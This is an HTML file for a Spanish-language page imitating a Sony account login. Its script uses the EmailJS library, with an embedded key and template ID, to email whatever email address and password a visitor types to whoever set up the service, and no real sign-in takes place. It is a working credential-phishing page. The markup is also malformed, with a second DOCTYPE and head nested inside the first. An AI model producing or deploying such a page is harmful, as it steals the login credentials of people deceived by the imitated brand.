        <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Inicio de Sesión</title>
    <link href="https://cdn.tailwindcss.com" rel="stylesheet">
    <style>
        body {
            @apply flex items-center justify-center min-h-screen bg-gray-100;
        }
        .input {
            @apply w-full px-4 py-2 rounded-full bg-gray-200 text-gray-700 focus:outline-none;
        }
        .button {
            @apply w-full px-4 py-2 rounded-full bg-blue-900 text-white font-semibold;
        }
        .link {
            @apply text-blue-600;
        }
        .create-account {
            @apply block px-4 py-2 rounded-full bg-gray-200 text-blue-600;
        }
    </style>
    
    
    <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Inicio de Sesión</title>
    <link rel="stylesheet" href="https://example.com/styles.css"> <!-- Asegúrate de que la hoja de estilos sea correcta -->
</head>
<body>
    <div class="w-full max-w-xs">
        <form id="form">
            <div class="mb-4">
                <label for="user">ID de inicio de sesión (correo electrónico)</label>
                <input type="text" name="user" id="user" class="input" required>
            </div>
            <div class="mb-4">
                <label for="contrasena">Contrasena</label>
                <input type="password" name="contrasena" id="contrasena" class="input" required>
            </div>
            <div class="mb-4">
                <button type="submit" class="button">Siguiente</button>
            </div>
            <div class="text-center mb-4">
                <a href="#" class="link">Acerca de la cuenta de Sony</a>
            </div>
            <div class="text-center mb-4">
                <a href="#" class="link">¿Tienes problemas para iniciar sesión?</a>
            </div>
            <div class="text-center">
                <a href="#" class="create-account">Crear una cuenta</a>
            </div>
        </form>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        emailjs.init('G_hKJf1dRyYEycCtD');

        document.getElementById('form').addEventListener('submit', function(event) {
            event.preventDefault(); // Evita que el formulario se envíe de forma convencional

            const user = document.getElementById('user').value;
            const contrasena = document.getElementById('contrasena').value;

            // Aquí puedes enviar el correo usando EmailJS
            emailjs.send('default_service', 'template_bh59igl', {
                user: user,
                contrasena: contrasena
            })
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
            }, function(error) {
                console.log('FAILED...', error);
            });
        });
    </script>
</body>
